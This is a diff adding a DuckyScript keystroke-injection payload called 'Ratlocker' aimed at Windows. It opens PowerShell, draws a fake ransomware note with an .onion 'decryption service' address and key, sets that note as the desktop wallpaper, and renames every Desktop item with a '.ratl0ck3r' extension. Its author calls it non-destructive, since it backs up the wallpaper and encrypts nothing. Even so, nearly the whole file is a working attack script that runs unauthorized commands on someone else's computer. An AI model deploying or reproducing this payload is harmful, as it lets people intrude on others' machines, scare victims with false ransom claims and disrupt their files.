@@ -1,0 +1,113 @@
+REM Title:          Ratlocker
+REM Author:	    Ratcode404(.github.io)
+REM Target:         Windows
+REM Description:    Adds ratcode file extensions, draws and sets background without the use of URLs or image download (avoid proxy blocking and detection). The original wallpaper will be backuped on \pictures\wallpaper.ratl0ck3r, so no files will be lost. The current setup only targets the files and folder structures on $HOME\Desktop\, but it could be easily extended by adjusting the path variable further down.
+
+REM Base delay after initiation and ps1 startup
+DELAY 250
+GUI d
+GUI r
+DELAY 100
+STRING powershell.exe
+ENTER
+DELAY 250
+
+REM Backup Wallpaper
+STRING Copy-Item "$HOME\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper" -Destination $home\pictures\wallpaper.ratl0ck3r
+ENTER
+DELAY 250
+
+REM Create new wallpaper
+STRING Add-Type -AssemblyName System.Drawing
+ENTER
+STRING $filename = "$home\pictures\ratl0ck3r.png"
+ENTER
+STRING $bmp = new-object System.Drawing.Bitmap 1080,720
+ENTER
+STRING $font = new-object System.Drawing.Font Consolas,10
+ENTER
+STRING $brushBg = [System.Drawing.Brushes]::Black
+ENTER
+STRING $brushFg = [System.Drawing.Brushes]::Green
+ENTER
+STRING $graphics = [System.Drawing.Graphics]::FromImage($bmp)
+ENTER
+STRING $graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height)
+ENTER
+STRING $graphics.DrawString('Your device has been encrypted by ratlocker.
+ENTER
+ENTER
+STRING            ____()()
+ENTER
+STRING          /      OO
+ENTER
+STRING     ~~~~~\_;m__m._>o
+ENTER
+ENTER
+ENTER
+STRING Oops! Your files have been encrypted.ENTER
+ENTER
+STRING If you see this text, your files are no longer accessible. You might
+ENTER
+STRING have been looking for a way to recover your files, but do not waste
+ENTER
+STRING your time. No one will be able to recover them without a decrytion
+ENTER
+STRING service.
+ENTER
+ENTER
+STRING We gurantee that you can recover all your files safely. All you need
+ENTER
+STRING to do is get the decryption password.
+ENTER
+ENTER
+STRING Visit out web services at: fakerat404linkszt3xaxqzf2nm12.onion
+ENTER
+ENTER
+STRING Your personal installation key #1:
+ENTER
+ENTER
+STRING b0d549572a40f93aa57400dbe43ee72a5e545f47765ef5fb7d17c7e83001cb3d',$font,$brushFg,10,10)
+ENTER
+STRING $graphics.Dispose()
+ENTER
+STRING $bmp.Save($filename)
+ENTER
+DELAY 500
+
+REM Set new wallpaper
+STRING $MyWallpaper="$home\pictures\ratl0ck3r.png"
+ENTER
+STRING $code = @'
+ENTER
+STRING using System.Runtime.InteropServices;
+ENTER
+STRING namespace Win32{
+ENTER
+STRING      public class Wallpaper{
+ENTER
+STRING         [DllImport("user32.dll", CharSet=CharSet.Auto)]
+ENTER
+STRING          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;
+ENTER
+STRING          public static void SetWallpaper(string thePath){
+ENTER
+STRING            SystemParametersInfo(20,0,thePath,3);
+ENTER
+STRING          }
+ENTER
+STRING     }
+ENTER
+STRING  } 
+ENTER
+STRING '@
+ENTER
+STRING add-type $code 
+ENTER
+STRING [Win32.Wallpaper]::SetWallpaper($MyWallpaper)
+ENTER
+DELAY 500
+
+REM Add ratl0ck3r extension
+STRING dir $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
+ENTER
